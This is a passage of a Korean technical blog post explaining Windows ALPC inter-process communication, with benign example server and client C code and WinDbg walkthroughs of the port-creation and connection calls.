&#xBE44;&#xB3D9;&#xAE30; &#xC5F0;&#xACB0;(Async)<ul><li>&#xC5F0;&#xACB0; &#xC694;&#xCCAD;&#xC744; &#xC11C;&#xBC84;&#xAC00; &#xCC98;&#xB9AC;&#xD574;&#xC11C; &#xC2E4;&#xC81C;&#xB85C; &#xBC1B;&#xC544;&#xB4E4;&#xC774;&#xAE30; &#xC804;&#xC5D0;, &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xB294; &#xD578;&#xB4E4;&#xC744; &#xD558;&#xB098; &#xBC1B;&#xC544;&#xBC84;&#xB9B4; &#xC218; &#xC788;&#xC74C;</li><li>&#xB9CC;&#xC57D; &#xC11C;&#xBC84;&#xAC00; &#xC544;&#xC9C1; &#xC5F0;&#xACB0; &#xC694;&#xCCAD;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xC0C1;&#xD0DC;&#xC5D0;&#xC11C; &#xD074;&#xB77C;&#xC774;&#xC5CD;&#xB290;&#xAC00; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xBCF4;&#xB0B4;&#xBA74; &#xC5D0;&#xB7EC;&#xAC00; &#xB0A0; &#xC218; &#xC788;&#xC74C;</li></ul></li></ul><blockquote><p><strong>NtAlpcSendWaitReceivePort()</strong></p></blockquote><pre><code class="hljs cpp"><span class="hljs-function">NTSTATUS <span class="hljs-title">NtAlpcSendWaitReceivePort</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">    HANDLE PortHandle,</span></span><span class="hljs-function"><span class="hljs-params">    DWORD Flags,</span></span><span class="hljs-function"><span class="hljs-params">    PPORT_MESSAGE SendMessage,</span></span><span class="hljs-function"><span class="hljs-params">    PALPC_MESSAGE_ATTRIBUTES SendMessageAttributes,</span></span><span class="hljs-function"><span class="hljs-params">    PPORT_MESSAGE ReceiveMessage,</span></span><span class="hljs-function"><span class="hljs-params">    PSIZE_T BufferLength,</span></span><span class="hljs-function"><span class="hljs-params">    PALPC_MESSAGE_ATTRIBUTES ReceiveMessageAttributes,</span></span><span class="hljs-function"><span class="hljs-params">    PLARGE_INTEGER Timeout</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><ul><li>&#xAC00;&#xC7A5; &#xC911;&#xC694;&#xD55C; &#xD568;&#xC218;&#xB85C;, &#xC774; &#xD568;&#xC218; &#xD558;&#xB098;&#xB85C; &#xBA54;&#xC2DC;&#xC9C0; &#xBCF4;&#xB0B4;&#xAE30;, &#xBC1B;&#xAE30; &#xB3D9;&#xC2DC;&#xC5D0; &#xAC00;&#xB2A5;!!</li><li>SendMessage, ReciveBuffer&#xB294; &#xB9D0; &#xADF8;&#xB300;&#xB85C; &#xC1A1;/&#xC218;&#xC2E0; &#xBA54;&#xC2DC;&#xC9C0; &#xBC84;&#xD37C;</li><li>InMessageBuffer, OutMessageBuffer&#xB294; &#xBA54;&#xC2DC;&#xC9C0;&#xC640; &#xD568;&#xAED8; &#xCD94;&#xAC00; &#xC561;&#xC158;(&#xC139;&#xC158; &#xB9E4;&#xD551;, &#xD578;&#xB4E4; &#xC804;&#xB2EC; &#xB4F1;)&#xC744; &#xC694;&#xCCAD;/&#xC751;&#xB2F5;&#xD558;&#xB294;&#xB370; &#xC4F0;&#xC784;</li></ul><h2 id="2-ALPC-&#xD1B5;&#xC2E0;-&#xD750;&#xB984;"><a href="#2-ALPC-&#xD1B5;&#xC2E0;-&#xD750;&#xB984;" class="headerlink" title="2. ALPC &#xD1B5;&#xC2E0; &#xD750;&#xB984;"></a>2. ALPC &#xD1B5;&#xC2E0; &#xD750;&#xB984;</h2><p>&#xC88B;&#xC544;&#xC694;, &#xB300;&#xCDA9; &#xD568;&#xC218;&#xB4E4;&#xC774; &#xC5B4;&#xB5A4; &#xC5ED;&#xD560;&#xC744; &#xD558;&#xB294;&#xC9C0; &#xC54C;&#xC558;&#xC73C;&#xB2C8;, &#xC81C;&#xB300;&#xB85C;&#xB41C; &#xD1B5;&#xC2E0; &#xD750;&#xB984;&#xC744; &#xC54C;&#xC544;&#xBCFC;&#xAE4C;&#xC694;? &#xC55E;&#xC11C; ALPC &#xD1B5;&#xC2E0; &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xC5D0;&#xC11C; 3&#xAC1C;&#xC758; ALPC &#xD3EC;&#xD2B8;&#xB97C; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;&#xACE0; &#xD588;&#xC5C8;&#xC8E0;! </p><ol><li>&#xC11C;&#xBC84; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC0DD;&#xC131;&#xD558;&#xB294; ALPC connection port</li><li>&#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; &#xC5F0;&#xACB0;&#xD560; &#xB54C; &#xCEE4;&#xB110;&#xC774; &#xC0C8;&#xB85C; &#xB9CC;&#xB4DC;&#xB294; ALPC server communication port</li><li>ALPC client communication port</li></ol><p>&#xC774;&#xB807;&#xAC8C; 3&#xAC00;&#xC9C0;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294;&#xB370;&#xC694;, &#xC774;&#xB807;&#xAC8C;&#xB9CC; &#xBCF4;&#xBA74; &#xBB34;&#xC2A8; &#xC18C;&#xB9AC;&#xC778;&#xC9C0; &#xC774;&#xD574;&#xAC00; &#xC798; &#xC548;&#xB418;&#xC8E0;..? <del>&#xC804; &#xADF8;&#xB7AC;&#xC2B5;&#xB2C8;&#xB2E4;&#x3160;</del></p><p>&#xC0AC;&#xC2E4; ALPC &#xD1B5;&#xC2E0; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xB17C;&#xB9AC;&#xC801;&#xC73C;&#xB85C; 3&#xAC1C;&#xC758; &#xD3EC;&#xD2B8;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xAC83;&#xCC98;&#xB7FC; &#xBCF4;&#xC774;&#xC9C0;&#xB9CC;, &#xC2E4;&#xC81C;&#xB85C;&#xB294; &#xD558;&#xB098;&#xC758; ALPC &#xD3EC;&#xD2B8; &#xAC1D;&#xCCB4;&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xC5EC;&#xB7EC; &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xAC00; &#xC0DD;&#xC131;&#xB418;&#xB294; &#xAD6C;&#xC870;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xC81C; &#xD1B5;&#xC2E0; &#xD750;&#xB984;&#xC744; &#xC21C;&#xC11C;&#xB300;&#xB85C; &#xC9DA;&#xC5B4;&#xAC00;&#xBA70; &#xC774;&#xD574;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;!</p><p><img src="image%205.png" alt="[&#xBAA8;&#xB4E0; &#xAC83;&#xC744; &#xD0C0;&#xD611;&#xD558;&#xAE30; &#xC704;&#xD574; N&#xC77C; &#xCCB4;&#xC778;: 2&#xBD80; &#x2014; Windows &#xCEE4;&#xB110; LPE (&#xC77C;&#xBA85; &#xD06C;&#xB86C; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; Escape) - Theori BLOG](https://theori.io/blog/chaining-n-days-to-compromise-all-part-2-windows-kernel-lpe-a-k-a-chrome-sandbox-escape)"></p><p><a href="https://theori.io/blog/chaining-n-days-to-compromise-all-part-2-windows-kernel-lpe-a-k-a-chrome-sandbox-escape">&#xBAA8;&#xB4E0; &#xAC83;&#xC744; &#xD0C0;&#xD611;&#xD558;&#xAE30; &#xC704;&#xD574; N&#xC77C; &#xCCB4;&#xC778;: 2&#xBD80; &#x2014; Windows &#xCEE4;&#xB110; LPE (&#xC77C;&#xBA85; &#xD06C;&#xB86C; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; Escape) - Theori BLOG</a></p><p>&#xAC00;&#xC7A5; &#xC8FC;&#xBAA9;&#xD560; &#xD568;&#xC218;&#xB294; &#xC5ED;&#xC2DC;&#xB098; <code>NtAlpcSendWaitReceivePort()</code> &#xD568;&#xC218;&#xC785;&#xB2C8;&#xB2E4;. &#xC0AC;&#xC2E4;&#xC0C1; &#xC774; &#xD568;&#xC218;&#xAC00; &#xC694;&#xCCAD;&#xC774;&#xB098; &#xC2B9;&#xC778;&#xC744; &#xC8FC;&#xACE0;&#xBC1B;&#xB294; &#xC5ED;&#xD560;&#xC744; &#xC804;&#xBD80; &#xD574;&#xC8FC;&#xAE30; &#xB54C;&#xBB38;&#xC774;&#xC8E0;! &#xC21C;&#xC11C;&#xB300;&#xB85C; &#xD750;&#xB984;&#xC744; &#xB9D0;&#xD558;&#xC790;&#xBA74; &#xC774;&#xB807;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xC11C;&#xBC84; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; <code>NtAlpcCreatePort()</code> &#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; ALPC &#xD3EC;&#xD2B8;&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.<ul><li>&#xC774;&#xB984; &#xC608;&#xC2DC; : &#x201C;\RPC Control\HackyBoiz&#x201D;</li></ul></li><li><p>&#xCEE4;&#xB110;&#xC740; ALPC &#xD3EC;&#xD2B8; &#xAC1D;&#xCCB4;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xACE0; &#xC11C;&#xBC84;&#xC5D0;&#xC138; &#xD578;&#xB4E4;&#xC744; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</p><p> &#x2192; &#xC774;&#xAC83;&#xC774; <strong>ALPC Connection Port!</strong></p></li><li><p>&#xC11C;&#xBC84;&#xB294; <code>NtAlpcSendWaitRecievePort()</code> &#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8; &#xC5F0;&#xACB0;&#xC744; &#xAE30;&#xB2E4;&#xB9BD;&#xB2C8;&#xB2E4;.</p></li><li>&#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xB294; <code>NtAlpcConnectPort()</code> &#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.<ul><li>&#xC5F0;&#xACB0;&#xD560; &#xC11C;&#xBC84; &#xD3EC;&#xD2B8; &#xC774;&#xB984; : &#x201C;\RPC Control\HackyBoiz&#x201D;</li><li>(&#xC120;&#xD0DD;) &#xC11C;&#xBC84;&#xC5D0;&#xAC8C; &#xBCF4;&#xB0BC; &#xCD08;&#xAE30; &#xBA54;&#xC2DC;&#xC9C0;</li><li>(&#xC120;&#xD0DD;) &#xC11C;&#xBC84; SID &#xC9C0;&#xC815;&#xD558;&#xC5EC; &#xC62C;&#xBC14;&#xB978; &#xC11C;&#xBC84;&#xC778;&#xC9C0; &#xAC80;&#xC99D;</li><li>(&#xC120;&#xD0DD;) &#xBA54;&#xC2DC;&#xC9C0; &#xC18D;&#xC131;(Attribute) &#xCD94;&#xAC00;</li></ul></li><li>&#xC774; &#xC694;&#xCCAD;&#xC740; &#xC11C;&#xBC84;&#xC5D0; &#xC804;&#xB2EC;&#xB418;&#xBA70;, &#xC11C;&#xBC84;&#xB294; <code>NtAlpcAcceptConnectPort()</code> &#xB97C; &#xD638;&#xCD9C;&#xD574; &#xC5F0;&#xACB0;&#xC744; &#xC2B9;&#xC778;&#xD558;&#xAC70;&#xB098; &#xAC70;&#xC808;&#xD569;&#xB2C8;&#xB2E4;.<ul><li>&#xB9C8;&#xC9C0;&#xB9C9; &#xC778;&#xC790;&#xAC00; boolean &#xC73C;&#xB85C; true&#xBA74; &#xC218;&#xB77D;, false&#xBA74; &#xAC70;&#xC808;&#xC744; &#xB73B;&#xD568;</li></ul></li><li>&#xC5F0;&#xACB0;&#xC744; &#xC218;&#xB77D; &#xC2DC;, &#xCEE4;&#xB110;&#xC740; &#xC0C8;&#xB85C;&#xC6B4; ALPC Communication Port&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xC5EC; &#xC11C;&#xBC84;&#xC640; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8; &#xC591;&#xCABD;&#xC5D0; &#xAC01;&#xAC01; &#xD578;&#xB4E4;&#xC744; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xC774;&#xD6C4; &#xBA54;&#xC2DC;&#xC9C0;&#xB294; Connection Port&#xAC00; &#xC544;&#xB2CC;, &#xC774; Communication Port&#xB97C; &#xD1B5;&#xD574; &#xC1A1;&#xC218;&#xC2E0; &#xB429;&#xB2C8;&#xB2E4;.</li></ol><p>&#xC774;&#xC81C;&#xB294; &#xC870;&#xAE08; &#xC774;&#xD574;&#xAC00; &#xB418;&#xB294;&#xAD70;&#xC694;!! &#xC88B;&#xC544;&#xC694; &#xADF8;&#xB807;&#xB2E4;&#xBA74; &#xC774;&#xC81C; &#xC2E4;&#xC2B5;&#xC744; &#xD1B5;&#xD574; &#xC9C1;&#xC811; &#xB514;&#xBC84;&#xAE45;&#xD574;&#xC11C; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><p><a href="https://github.com/DownWithUp/ALPC-Example">https://github.com/DownWithUp/ALPC-Example</a></p><p>&#xC704; github&#xC5D0;&#xC11C; &#xC608;&#xC81C; ALPC &#xCF54;&#xB4DC;&#xB97C; &#xD655;&#xC778; &#xD560; &#xC218; &#xC788;&#xB294;&#xB370;&#xC694;, &#xC9C1;&#xC811; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xC5EC; &#xD1B5;&#xC2E0; &#xACFC;&#xC815;&#xC744; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;!XD</p><blockquote><p>Server.c</p></blockquote><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;winternl.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;ntalpcapi.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">&quot;ntdll.lib&quot;</span>)</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX_MSG_LEN 0x500</span><span class="hljs-function">LPVOID <span class="hljs-title">AllocMsgMem</span><span class="hljs-params">(SIZE_T Size)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">return</span>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, Size + <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE)));}<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">CreatePortAndListen</span><span class="hljs-params">(LPCWSTR PortName)</span></span><span class="hljs-function"></span>{    ALPC_PORT_ATTRIBUTES    serverPortAttr;    OBJECT_ATTRIBUTES       objPort;    UNICODE_STRING          usPortName;    PORT_MESSAGE            pmRequest;    PORT_MESSAGE            pmReceive;    NTSTATUS                ntRet;    BOOLEAN                 bBreak;    HANDLE                  hConnectedPort;    HANDLE                  hPort;    SIZE_T                  nLen;    LPVOID                  lpMem;    BYTE                    bTemp;      RtlInitUnicodeString(&amp;usPortName, PortName);    InitializeObjectAttributes(&amp;objPort, &amp;usPortName, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);    RtlSecureZeroMemory(&amp;serverPortAttr, <span class="hljs-keyword">sizeof</span>(serverPortAttr));    serverPortAttr.MaxMessageLength = MAX_MSG_LEN;    ntRet = NtAlpcCreatePort(&amp;hPort, &amp;objPort, &amp;serverPortAttr);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[i] NtAlpcCreatePort: 0x%X\n&quot;</span>, ntRet);    <span class="hljs-keyword">if</span> (!ntRet)    {        nLen = <span class="hljs-keyword">sizeof</span>(pmReceive);        ntRet = NtAlpcSendWaitReceivePort(hPort, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;pmReceive, &amp;nLen, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);        <span class="hljs-keyword">if</span> (!ntRet)        {            RtlSecureZeroMemory(&amp;pmRequest, <span class="hljs-keyword">sizeof</span>(pmRequest));            pmRequest.MessageId = pmReceive.MessageId;            pmRequest.u1.s1.DataLength = <span class="hljs-number">0x0</span>;            pmRequest.u1.s1.TotalLength = pmRequest.u1.s1.DataLength + <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE);            ntRet = NtAlpcAcceptConnectPort(&amp;hConnectedPort, hPort, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;pmRequest, <span class="hljs-literal">NULL</span>, TRUE); <span class="hljs-comment">// 0</span>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[i] NtAlpcAcceptConnectPort: 0x%X\n&quot;</span>, ntRet);            <span class="hljs-keyword">if</span> (!ntRet)            {                bBreak = TRUE;                <span class="hljs-keyword">while</span> (bBreak)                {                    nLen = MAX_MSG_LEN;                    lpMem = AllocMsgMem(nLen);                    NtAlpcSendWaitReceivePort(hPort, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, (PPORT_MESSAGE)lpMem, &amp;nLen, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);                    pmReceive = *(PORT_MESSAGE*)lpMem;                    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>((BYTE*)lpMem + <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE), <span class="hljs-string">&quot;exit\n&quot;</span>))                    {                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[i] Received &apos;exit&apos; command\n&quot;</span>);                        HeapFree(GetProcessHeap(), <span class="hljs-number">0</span>, lpMem);                        ntRet = NtAlpcDisconnectPort(hPort, <span class="hljs-number">0</span>);                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[i] NtAlpcDisconnectPort: %X\n&quot;</span>, ntRet);                        CloseHandle(hConnectedPort);                        CloseHandle(hPort);                        ExitThread(<span class="hljs-number">0</span>);                    }                    <span class="hljs-keyword">else</span>                    {                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[i] Received Data: &quot;</span>);                        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt;= pmReceive.u1.s1.DataLength; i++)                        {                            bTemp = *(BYTE*)((BYTE*)lpMem + i + <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE));                            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%X &quot;</span>, bTemp);                        }                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);                        HeapFree(GetProcessHeap(), <span class="hljs-number">0</span>, lpMem);                    }                }            }        }    }    ExitThread(<span class="hljs-number">0</span>);}<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>{    HANDLE hThread;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[i] ALPC-Example Server\n&quot;</span>);    hThread = CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)&amp;CreatePortAndListen, <span class="hljs-string">L&quot;\\RPC Control\\HackyBoiz&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);    WaitForSingleObject(hThread, INFINITE);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[!] Shuting down server\n&quot;</span>);    getchar();    <span class="hljs-keyword">return</span>;}</code></pre><blockquote><p>Client.c</p></blockquote><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;winternl.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;ntalpcapi.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">&quot;ntdll.lib&quot;</span>)</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MSG_LEN 0x100</span><span class="hljs-function">LPVOID <span class="hljs-title">CreateMsgMem</span><span class="hljs-params">(PPORT_MESSAGE PortMessage, SIZE_T MessageSize, LPVOID Message)</span></span><span class="hljs-function"></span>{    LPVOID lpMem = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MessageSize + <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE));    memmove(lpMem, PortMessage, <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE));    memmove((BYTE*)lpMem + <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE), Message, MessageSize);    <span class="hljs-keyword">return</span>(lpMem);}<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>{    UNICODE_STRING  usPort;    PORT_MESSAGE    pmSend;    PORT_MESSAGE    pmReceive;    NTSTATUS        ntRet;    BOOLEAN         bBreak;    SIZE_T          nLen;    HANDLE          hPort;    LPVOID          lpMem;     CHAR            szInput[MSG_LEN];    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ALPC-Example Client\n&quot;</span>);    RtlInitUnicodeString(&amp;usPort, <span class="hljs-string">L&quot;\\RPC Control\\HackyBoiz&quot;</span>);    RtlSecureZeroMemory(&amp;pmSend, <span class="hljs-keyword">sizeof</span>(pmSend));    pmSend.u1.s1.DataLength = MSG_LEN;    pmSend.u1.s1.TotalLength = pmSend.u1.s1.DataLength + <span class="hljs-keyword">sizeof</span>(pmSend);    lpMem = CreateMsgMem(&amp;pmSend, MSG_LEN, <span class="hljs-string">L&quot;Hello HackyBoiz!&quot;</span>);    ntRet = NtAlpcConnectPort(&amp;hPort, &amp;usPort, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[i] NtAlpcConnectPort: 0x%X\n&quot;</span>, ntRet);    <span class="hljs-keyword">if</span> (!ntRet)    {        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[i] type &apos;exit&apos; to disconnect from the server\n&quot;</span>);        bBreak = TRUE;        <span class="hljs-keyword">while</span> (bBreak)        {            RtlSecureZeroMemory(&amp;pmSend, <span class="hljs-keyword">sizeof</span>(pmSend));            RtlSecureZeroMemory(&amp;szInput, <span class="hljs-keyword">sizeof</span>(szInput));            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[.] Enter Message &gt; &quot;</span>);            fgets(&amp;szInput, MSG_LEN, <span class="hljs-built_in">stdin</span>);            pmSend.u1.s1.DataLength = <span class="hljs-built_in">strlen</span>(szInput);            pmSend.u1.s1.TotalLength = pmSend.u1.s1.DataLength + <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE);            lpMem = CreateMsgMem(&amp;pmSend, pmSend.u1.s1.DataLength, &amp;szInput);            ntRet = NtAlpcSendWaitReceivePort(hPort, <span class="hljs-number">0</span>, (PPORT_MESSAGE)lpMem, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[i] NtAlpcSendWaitReceivePort: 0x%X\n&quot;</span>, ntRet);            HeapFree(GetProcessHeap(), <span class="hljs-number">0</span>, lpMem);        }    }    getchar();    <span class="hljs-keyword">return</span>;}</code></pre><p>&#xC77C;&#xB2E8; Server.c &#xCF54;&#xB4DC;&#xB97C; &#xBE4C;&#xB4DC;&#xD558;&#xC5EC; &#xC2E4;&#xD589;&#xC2DC;&#xD0A4;&#xBA74; \RPC Control &#xC704;&#xCE58;&#xC5D0; Server ALPC Port&#xAC00; &#xC0DD;&#xAE34; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC8E0;!</p><p><img src="image%206.png" alt="image.png"></p><p>Windbg&#xB85C; Server &#xBD80;&#xBD84;&#xC744; &#xB514;&#xBC84;&#xAE45; &#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBA3C;&#xC800; NtAlpcCreatePort &#xD568;&#xC218;&#xB97C; &#xBCFC;&#xAE4C;&#xC694;!</p><pre><code class="hljs cpp"><span class="hljs-function">NTSTATUS NTAPI <span class="hljs-title">NtAlpcCreatePort</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">    OUT PHANDLE PortHandle,</span></span><span class="hljs-function"><span class="hljs-params">    IN POBJECT_ATTRIBUTES ObjectAttributes,</span></span><span class="hljs-function"><span class="hljs-params">    IN OUT PALPC_INFO PortInformation OPTIONAL</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><p><img src="image%207.png" alt="image.png"></p><p>bp&#xB97C; &#xAC74; &#xB4A4;, rdx &#xBD80;&#xBD84;&#xC774; ObjectAttributes &#xBD80;&#xBD84;&#xC785;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC11C; Attributes&#xC5D0; &#xB300;&#xD574;&#xC11C;&#xB294; &#xC870;&#xAE08; &#xC774;&#xB530;&#xAC00; &#xB354; &#xC790;&#xC138;&#xD558;&#xAC8C; &#xC54C;&#xC544;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACE0;, &#xC774; &#xC548;&#xC5D0; ObjectName&#xC774; &#xC874;&#xC7AC;&#xD560; &#xAC81;&#xB2C8;&#xB2E4;. POBJECT_ATTRIBUTES &#xAD6C;&#xC870;&#xCCB4;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">OBJECT_ATTRIBUTES</span> {</span>    ULONG           Length;    HANDLE          RootDirectory;    PUNICODE_STRING ObjectName;   <span class="hljs-comment">// &#x2190; &#xC774;&#xAC70;</span>    ULONG           Attributes;    PVOID           SecurityDescriptor;    PVOID           SecurityQualityOfService;} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;</code></pre><p>&#xADF8;&#xB807;&#xB2E4;&#xBA74; rdx + 0x10 &#xBD80;&#xBD84;&#xC774; ObjectName &#xC774;&#xACA0;&#xC8E0;? &#xC774;&#xB97C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74;</p><p><img src="image%208.png" alt="image.png"></p><p>&#xC774;&#xB807;&#xAC8C; \RPC Control\HackyBoiz &#xC774;&#xB984;&#xC73C;&#xB85C; Port&#xAC00; &#xC0DD;&#xC131;&#xB418;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>&#xC774;&#xC81C; Windbg&#xB85C; Client &#xBD80;&#xBD84;&#xC744; &#xB514;&#xBC84;&#xAE45;&#xD558;&#xC5EC; &#xD1B5;&#xC2E0;&#xC744; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image%209.png" alt="image.png"></p><p>&#xC77C;&#xB2E8; Client&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74; Server&#xC5D0;&#xC11C; Accept&#xB97C; &#xD574;&#xC900; &#xB4A4;, Client&#xC5D0;&#xC11C; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xBCF4;&#xB0BC; &#xC218; &#xC788;&#xAC8C;&#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xBD80;&#xBD84;&#xC744; &#xC880; &#xB354; &#xC790;&#xC138;&#xD558;&#xAC8C; &#xD655;&#xC778;&#xD574;&#xBCFC;&#xAC8C;&#xC694;!</p><p><img src="image%2010.png" alt="image.png"></p><p>&#xC77C;&#xB2E8; &#xCC98;&#xC74C;&#xC5D0; &#xC5F0;&#xACB0;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC778; NtAlpcConnectPort&#xB97C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74; </p><pre><code class="hljs cpp"><span class="hljs-function">NTSTATUS NTAPI <span class="hljs-title">NtAlpcConnectPort</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">    OUT PHANDLE PortHandle,</span></span><span class="hljs-function"><span class="hljs-params">    IN PUNICODE_STRING PortName, <span class="hljs-comment">// &lt;- &#xC774;&#xACF3;</span></span></span><span class="hljs-function"><span class="hljs-params">    IN POBJECT_ATTRIBUTES ObjectAttributes,</span></span><span class="hljs-function"><span class="hljs-params">    IN 